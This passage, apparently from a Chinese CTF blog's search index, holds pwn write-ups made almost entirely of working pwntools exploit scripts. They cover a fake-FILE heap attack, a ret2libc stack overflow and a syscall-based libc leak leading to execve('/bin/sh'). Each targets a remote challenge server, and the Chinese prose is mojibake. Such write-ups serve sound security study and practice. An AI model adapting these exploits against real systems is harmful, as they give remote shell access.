class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x211</span>))<br>    add(<span class="hljs-number">0xdc0</span>)<span class="hljs-comment">#5</span><br>    add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#6</span><br>    edit(<span class="hljs-number">6</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x211</span>))<br>    add(<span class="hljs-number">0x1000</span>)<span class="hljs-comment">#7</span><br>    edit(<span class="hljs-number">6</span>,<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x1f1</span>)+p64(stdout))<br>    fake_io = flat(&#123;<br>        <span class="hljs-number">0x0</span>: <span class="hljs-string">b&#x27; sh&#x27;</span>,<br>        <span class="hljs-number">0xa0</span>: p64(stdout-<span class="hljs-number">0x130</span>+<span class="hljs-number">0xd8</span>),<br>        <span class="hljs-number">0x10</span>: p64(libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]),<br>        <span class="hljs-number">0x20</span>: p64(stdout),<br>        <span class="hljs-number">0x98</span>: p64(stdout-<span class="hljs-number">0x20</span>+<span class="hljs-number">0x80</span>),<br>        <span class="hljs-number">0xd8</span>: p64(wfile_jump + <span class="hljs-number">0x48</span> - <span class="hljs-number">0x38</span>),<br>        <span class="hljs-number">0x60</span>: <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>,<br>        <span class="hljs-number">0x80</span>: p64(libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]),<br>        <span class="hljs-number">0x88</span>: p64(stdout - <span class="hljs-number">0x30</span>),<br>        <span class="hljs-number">0xe0</span>: p64(stdout - <span class="hljs-number">8</span>),<br>    &#125;, filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    add(<span class="hljs-number">0x1e0</span>)<span class="hljs-comment">#8</span><br>    add(<span class="hljs-number">0x1e0</span>)<span class="hljs-comment">#9</span><br>    edit(<span class="hljs-number">9</span>,<span class="hljs-built_in">len</span>(fake_io),fake_io)<br>    p.interactive()<br>pwn()<br></code></pre></td></tr></table></figure><h4 id="å°è“é²¨stack"><a href="#å°è“é²¨stack" class="headerlink" title="å°è“é²¨stack"></a>å°è“é²¨stack</h4><p>ret2libcæ¿å­ã€‚æ³¨æ„printféœ€è¦æ ˆå¯¹é½ï¼Œä¹ŸåŒ…æ‹¬é‡å¯mainåçš„printfï¼Œéœ€è¦ç”¨retå¯¹é½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main&quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">36450</span>)<br>main = <span class="hljs-number">0x4011df</span><br>puts_got = e.got[<span class="hljs-string">&quot;printf&quot;</span>]<br>puts_plt = e.plt[<span class="hljs-string">&quot;printf&quot;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x401293</span><br>ret = <span class="hljs-number">0x401294</span><br><br>payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span> + p64(pop_rdi_ret) + p64(puts_got) \<br>    +p64(ret) +p64(puts_plt) + p64(ret)+ p64(main) <br>io.send(payload)<br>io.recvuntil(<span class="hljs-string">b&quot;\x40&quot;</span>)<br>puts_addr = u64(io.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&quot;printf&quot;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>payload = <span class="hljs-string">b&quot;c&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">b&quot;d&quot;</span>*<span class="hljs-number">8</span> + p64(pop_rdi_ret) + p64(binsh_addr) \<br>    + p64(ret) + p64(system_addr)<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h4><p>ç»™äº†3æ¬¡syscallçš„æœºä¼šï¼Œåˆ©ç”¨<code>shmget</code>+<code>shmat</code>leak libcï¼Œæ‹¿å‡º<code>/bin/sh</code>åœ°å€ï¼Œå†<code>execve</code>å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*main+64)</span><br><span class="hljs-comment">#                b *(*main+312)</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">20415</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;29&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;1000&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;8630&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;30&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;result:&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;RAX: &quot;</span>)<br>printf_addr = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;000&quot;</span>).decode()[<span class="hljs-number">2</span>:], <span class="hljs-number">16</span>) - <span class="hljs-number">2144528</span> + <span class="hljs-number">0xa000</span><br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(printf_addr+<span class="hljs-number">2144528</span>-<span class="hljs-number">0xa000</span>)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(printf_addr)&#125;</span>&quot;</span>)<br>libc_base = printf_addr - libc.sym[<span class="hljs-string">&quot;printf&quot;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>payload = <span class="hljs-built_in">str</span>(binsh_addr).encode()<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;59&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, payload)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
